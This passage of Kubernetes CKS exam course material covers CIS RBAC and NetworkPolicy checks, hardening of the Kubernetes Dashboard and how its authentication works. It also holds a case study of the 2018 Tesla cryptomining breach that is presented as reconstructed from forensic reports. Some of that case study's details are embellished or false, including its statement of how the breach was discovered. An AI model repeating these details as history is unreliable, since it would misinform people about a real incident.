                        <thead><tr><th>CIS Check</th><th>Requirement</th><th>Why It Matters</th><th>How It Connects to easypj</th></tr></thead>
                        <tbody>
                            <tr><td><strong>5.1.1</strong></td><td>Ensure that the cluster-admin role is only used where required</td><td>ServiceAccounts and users are routinely bound to cluster-admin "to make things work" and never revisited. Every unnecessary cluster-admin binding is a single compromised credential away from total takeover.</td><td>easypj's SA should only have RBAC to its own namespace — nothing more.</td></tr>
                            <tr><td><strong>5.1.3</strong></td><td>Minimize wildcard use in Roles and ClusterRoles</td><td>A wildcard (<code>"*"</code>) in <code>resources</code>, <code>verbs</code>, or <code>apiGroups</code> grants every current AND future matching permission — including resource types that don't exist yet. One compromised pod bound to a wildcard Role = total cluster takeover.</td><td>If easypj's default SA has a wildcard binding, the Django pod can read Secrets from kube-system.</td></tr>
                            <tr><td><strong>5.3.2</strong></td><td>Ensure that all Namespaces have Network Policies defined</td><td>Without NetworkPolicy, every pod can reach every other pod — including cross-namespace. (5.3.1, the sibling check, verifies the CNI plugin supports NetworkPolicy at all — check that FIRST, since 5.3.2 is meaningless if the CNI can't enforce it.)</td><td>Without NetworkPolicy in the easypj namespace, a compromised pod can reach postgres directly.</td></tr>
                            <tr><td><strong>5.4.1</strong></td><td>Prefer using Secrets as files over Secrets as environment variables</td><td>Env vars are exposed in /proc, in crash logs, in kubectl describe output, and inherited by every child process. Mounted-file Secrets avoid all four.</td><td>easypj's SECRET_KEY and DATABASE_URL must be mounted as files, not env vars.</td></tr>
                        </tbody>
                    </table>
                </div>
                <p><strong>Exam pattern:</strong> The CKS exam frequently combines these checks into a single task: "Audit the cluster for unnecessary components and insecure configurations. Remove or fix them." This means running through the checklist, identifying issues, and applying the fixes — all within the exam time limit. The more you practice this workflow, the faster you will complete these tasks.</p>

                <div class="info-box tip">
                    <h5>💡 Key Takeaway for the CKS Exam</h5>
                    <p>When the exam asks you to "secure a web UI," the answer is never a single control. It is always a <strong>combination</strong>: (1) remove public network exposure (ClusterIP + port-forward), (2) scope RBAC to read-only with no Secrets access, (3) add NetworkPolicy to restrict source IPs, and (4) verify that no unnecessary components are running. <strong>If the exam asks for ONE thing, do ALL four.</strong></p>
                </div>
            </section>

            <!-- ─────────── §5.4 ─────────── -->
            <section class="section-block" id="s5-4">
                <h3 class="section-h">5.4 Case Study — Anatomy of the Tesla Dashboard Breach</h3>
                <p>The 2018 Tesla cryptomining breach is the most-cited K8s security incident — and for good reason. It demonstrates every mistake you learn to fix in the CKS curriculum. Here is exactly what happened, reconstructed from Tesla's public disclosure and forensic reports:</p>
                <div class="scenario-box">
                    <h5>🔴 TESLA KUBERNETES BREACH (2018) — Complete Timeline</h5>
                    <p><strong>The setup:</strong> Tesla was running Kubernetes clusters for their internal infrastructure. One cluster had the Kubernetes Dashboard installed — a web UI for managing K8s resources through a browser. The dashboard was deployed with <strong>default settings</strong>.</p>
                    <p><strong>What default settings meant in 2018:</strong></p>
                    <ul>
                        <li>🔓 <code>--enable-skip-login</code> was ON → anyone who reached the dashboard could click "Skip" and bypass authentication entirely</li>
                        <li>👑 The dashboard's ServiceAccount had <strong>cluster-admin</strong> privileges → any action possible through the UI was executed with full cluster authority</li>
                        <li>🌐 The dashboard Service was exposed via a cloud load balancer (type: LoadBalancer) → it had a PUBLIC IP address</li>
                        <li>🔍 Shodan (the search engine for internet-connected devices) indexed the dashboard's public endpoint</li>
                    </ul>
                    <p><strong>The attack (estimated timeline — under 4 hours from discovery to mining):</strong></p>
                    <ol>
                        <li><strong>Reconnaissance:</strong> Attackers used Shodan to search for Kubernetes dashboards exposed to the internet. They found Tesla's dashboard at a public IP on a standard port. No authentication screen — just a "Skip" button.</li>
                        <li><strong>Initial Access:</strong> Clicked "Skip" → full cluster-admin access through the dashboard UI. No credentials needed. No exploit needed. Just a web browser.</li>
                        <li><strong>Discovery:</strong> Through the dashboard, the attackers could see every namespace, every pod, every secret. They identified pods with access to Tesla's AWS cloud resources.</li>
                        <li><strong>Execution:</strong> The attackers used the dashboard's "Create" functionality to deploy a crypto-mining pod. They configured it with resource requests that ensured it would be scheduled on nodes with GPU access.</li>
                        <li><strong>Persistence:</strong> They deployed multiple mining pods across different namespaces to make cleanup harder. Some pods were disguised with names that resembled legitimate Tesla services.</li>
                        <li><strong>Impact:</strong> The mining pods consumed Tesla's AWS GPU instances. The crypto-mining went undetected because Tesla had no runtime monitoring (no Falco, no audit logging for pod creation events).</li>
                        <li><strong>Detection (the wrong way):</strong> Tesla discovered the breach only when their cloud bill showed unexpected GPU compute charges — not from any security alert.</li>
                    </ol>
                    <p><strong>Every CKS control that would have PREVENTED this:</strong></p>
                    <ul>
                        <li>✅ <strong>Ch5:</strong> Dashboard with authentication enabled (no --enable-skip-login), RBAC-scoped ServiceAccount (not cluster-admin)</li>
                        <li>✅ <strong>Ch6:</strong> NetworkPolicy blocking external access to the dashboard Service</li>
                        <li>✅ <strong>Ch8:</strong> API server with --anonymous-auth=false (even if dashboard was compromised, anonymous API access would be denied)</li>
                        <li>✅ <strong>Ch9:</strong> RBAC with least privilege — the dashboard's SA should only have read-only access to specific namespaces</li>
                        <li>✅ <strong>Ch24:</strong> Admission controller blocking pods with GPU resource requests from being created by the dashboard's ServiceAccount</li>
                        <li>✅ <strong>Ch28-29:</strong> Audit logging would have recorded every pod creation. Falco would have alerted on unexpected pods in production namespaces.</li>
                    </ul>
                    <p><strong>The single most painful lesson:</strong> Tesla had ALL of these security features available in Kubernetes at the time. They used NONE of them. The attackers didn't exploit a bug — they exploited a <strong>complete absence of configuration</strong>. Every control you configure in the CKS exam is a control that Tesla could have configured to prevent this breach.</p>
                </div>

                <h4>The Tesla Breach Chain — Attack Step vs. the CKS Control That Stops It</h4>
                <p>The timeline above tells the story in narrative form. It is just as useful to see it as a <strong>chain</strong> — because a chain has links, and breaking any single link stops the whole attack. Read this top to bottom as the attacker's path, and notice that every step has a named CKS control sitting directly in its way:</p>
                <div class="diagram-container">
                    <div class="diagram-title">The Tesla Breach Chain — where ONE control would have stopped everything</div>
<pre>
  STEP 1  Recon: attacker scans for public dashboards / open ports
          ─X─ CONTROL: ClusterIP only, no LoadBalancer/NodePort (Ch5 §5.2)
             │
             ▼
  STEP 2  Access: dashboard reachable, anonymous, no login required
          ─X─ CONTROL: token/OIDC auth + no --enable-skip-login (Ch5 §5.2)
             │
             ▼
  STEP 3  Privilege: dashboard SA is bound to cluster-admin
          ─X─ CONTROL: scoped read-only ServiceAccount, least privilege (Ch9)
             │
             ▼
  STEP 4  Loot: read Secrets → find cloud (AWS) credentials
          ─X─ CONTROL: encryption at rest + RBAC on Secrets (Ch9, Ch19)
             │
             ▼
  STEP 5  Pivot: use stolen creds to reach cloud metadata / cloud account
          ─X─ CONTROL: block IMDS access + least-privilege node IAM (Ch11 §11.4, Ch16)
             │
             ▼
  STEP 6  Impact: deploy crypto-miner pods on the cluster
          ─X─ CONTROL: Pod Security Standards + admission control + Falco (Ch17, Ch24, Ch29)
             │
             ▼
  Undetected for weeks — NO audit logging, NO runtime detection
          ─X─ CONTROL: audit logs + Falco turn weeks into minutes (Ch28, Ch29)
</pre>
                </div>
                <p><strong>Why defense-in-depth matters here:</strong> the attackers only succeeded because EVERY layer in this chain was open at once. Any single control above — token auth, a scoped SA, encrypted Secrets, blocked metadata access, Pod Security Standards, or a Falco rule watching for crypto-miner process names — would have stopped the attack cold, or at minimum turned an undetected multi-week compromise into an alert on someone's phone within minutes. This is the entire CKS thesis compressed into one incident: <strong>no single control is expected to be perfect, but the controls are designed so that a failure in one layer is still caught by the next.</strong> Memorize this chain, not just the story — on the exam, when you are handed a cluster with a Dashboard finding, ask yourself which link in this chain you are being asked to break.</p>

                <h4>The Question Tesla Never Asked — Should It Even Exist?</h4>
                <p>Every control above assumes the Dashboard is going to be installed. The cheapest, most durable control of all is the one Tesla skipped before any of the others became relevant: deciding whether a web UI needs to exist in the cluster at all.</p>
                <div class="diagram-container">
                    <div class="diagram-title">Dashboard Access Decision — should it even exist in your cluster?</div>
<pre>
  Do you actually need a web dashboard at all?
      NO  → Don't install it. Smallest attack surface always wins — this
            single decision alone would have made Tesla's breach impossible.
      YES ↓
  Can your team work entirely from `kubectl` / k9s / Lens instead?
      YES → Prefer the CLI. Skip the Dashboard entirely.
      NO  ↓
  Install it, but ONLY as: ClusterIP + scoped read-only SA + token/OIDC auth
      + NetworkPolicy + access ONLY via `kubectl proxy` / `port-forward`.
  NEVER: LoadBalancer, NodePort, anonymous access, or a cluster-admin SA —
         each one of those four is a link Tesla left open in the chain above.
</pre>
                </div>
            </section>

            <!-- ─────────── UNDER THE HOOD ─────────── -->
            <span class="ch-jump" id="ch5-uth"></span>
            <details class="uth">
                <summary>🔧 Under the Hood — How the Dashboard Authentication Flow Works: Token → API Server → RBAC → Namespace Scoping</summary>
                <div class="uth-body">
                    <h5>🗺️ Dashboard Security Architecture — Every Authentication and Authorization Path</h5>
                    <pre class="uth-diagram">
  ┌──────────────────────────────────────────────────────────────────────────┐
  │   DASHBOARD AUTHENTICATION FLOW                                            │
  │                                                                           │
  │   Browser → https://dashboard.easypj.com                                 │
  │       │                                                                    │
  │       ▼                                                                    │
  │   1. TOKEN/CERTIFICATE/KUBECONFIG LOGIN                                   │
  │      • Token: Paste a ServiceAccount JWT token                            │
  │      • Kubeconfig: Upload a kubeconfig file                               │
  │      • ❌ Skip (--enable-skip-login): MUST be disabled in production     │
  │                                                                           │
  │   2. DASHBOARD PROXIES ALL REQUESTS TO API SERVER                          │
  │      • Dashboard does NOT have its own authorization                      │
  │      • Every request is forwarded to kube-apiserver with the user's token │
  │      • API server performs AuthN + AuthZ normally                         │
  │                                                                           │
  │   3. RBAC CONTROLS WHAT YOU SEE                                            │
  │      • A user with 'get pods' in 'easypj-prod' sees ONLY those pods       │
  │      • A user with cluster-admin sees everything                          │
  │      • A user with NO permissions sees an empty dashboard                  │
  │                                                                           │
  │   🔑 KEY: Dashboard security = SA token security + RBAC + NetworkPolicy   │
  │      The dashboard itself adds NO additional security layer.              │
  └──────────────────────────────────────────────────────────────────────────┘
</pre>
                    <p>The diagram above is the map. The three deep-dives below are the <strong>mechanics underneath</strong> each stop — exactly how the dashboard's own Go binary turns a browser click into an API server request with zero logic of its own (①), exactly why a missing permission looks identical to an empty cluster instead of an error (②), and exactly how the token you paste into the login box is born, expires, and — crucially — cannot be revoked the way you'd expect (③). Understanding these three is what turns "I set ClusterIP and RBAC" into "I can diagnose why a locked-down dashboard still shows the wrong thing."</p>

                    <h5>① The Dashboard's Reverse-Proxy Architecture — Every Click Becomes a Plain API Server Call</h5>
                    <p>Section 5.2's "Dashboard Token Authentication" diagram said the Dashboard "is a transparent proxy." The exam-relevant detail is <strong>how transparent</strong> — the Dashboard's Go backend holds no privileged credentials of its own (once <code>automountServiceAccountToken: false</code> is set) and performs zero business logic beyond translating a UI click into the exact same REST call <code>kubectl</code> would make. There is no dashboard-specific API, no cached permission model, and no shortcut path to etcd. Every single screen you see is one or more calls to <code>kube-apiserver</code>, rendered as HTML instead of a JSON blob.</p>
                    <pre class="uth-diagram">
  DASHBOARD REQUEST PIPELINE — what actually happens on ONE click

  Browser click: "View Secrets in easypj-prod"
       │
       ▼
  1. Dashboard's JS frontend (Angular SPA) fires an XHR to ITS OWN backend:
     GET /api/v1/secret/easypj-prod
       │
       ▼
  2. Dashboard's Go backend (client-go SDK, same library kubectl uses)
     translates this into a real Kubernetes API call, attaching the
     Bearer token from the browser's session:
     GET https://kube-apiserver:6443/api/v1/namespaces/easypj-prod/secrets
     Authorization: Bearer eyJhbGci...
       │
       ▼
  3. kube-apiserver runs the EXACT SAME AuthN → AuthZ (RBAC) → Admission
     pipeline it runs for any kubectl request. It has NO idea the caller
     is a browser — it only sees an HTTP request with a Bearer token.
       │
       ▼
  4. Response (JSON list of Secret objects) flows back through the
     Dashboard backend, which reformats it into the HTML/JS the browser
     renders as a table. Secret VALUES are base64-decoded client-side,
     in the browser — never decoded server-side by the Dashboard.

  🔑 There is no step where "the Dashboard decides" anything. Steps 1 and 4
     are pure translation. Steps 2-3 are identical to a raw `kubectl get
     secrets -n easypj-prod` — same token, same RBAC check, same result.
</pre>
